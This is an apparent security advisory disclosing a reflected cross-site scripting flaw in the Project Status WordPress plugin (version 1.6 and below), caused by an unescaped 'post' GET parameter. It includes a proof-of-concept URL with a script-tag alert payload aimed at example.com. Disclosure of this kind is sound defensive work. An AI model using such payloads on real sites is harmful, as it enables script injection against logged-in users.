## WordPress Plugin Vulnerabilities

# Project Status <= 1.6 - Reflected Cross-Site Scripting (XSS)

### Description

The pspin\_duplicate\_post\_save\_as\_new\_post function of the plugin does not sanitise, validate or escape the post GET parameter passed to it before outputting it in an error message when the related post does not exist, leading to a reflected XSS issue

### Proof of Concept

Open the below URL as any authenticated user
https://example.com/wp-admin/admin.php?action=pspin\_duplicate\_post\_save\_as\_new\_post\_draft&post=%3Cscript%3Ealert(document.domain)%3C/script%3E
